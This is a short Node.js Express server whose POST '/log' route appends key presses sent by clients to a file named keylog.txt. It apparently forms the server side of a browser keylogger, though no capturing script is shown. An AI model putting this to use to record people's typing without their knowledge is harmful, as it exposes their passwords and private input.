// Import required modules
const express = require('express');
const fs = require('fs');
const path = require('path');

// Initialize the Express app
const app = express();
const port = 3000;

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Parse incoming JSON requests
app.use(express.json());

// Handle POST request to log key presses
app.post('/log', (req, res) => {
    const { keyLog } = req.body; // Extract key log from the request body
    fs.appendFile('keylog.txt', keyLog + '\n', (err) => {
        if (err) {
            console.error(err); // Log any errors to the console
            return res.status(500).send('Failed to log key presses');
        }
        res.send('Key presses logged'); // Send success response
    });
});

// Catch-all route to serve the main HTML file
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start the server and listen on the specified port
app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
});
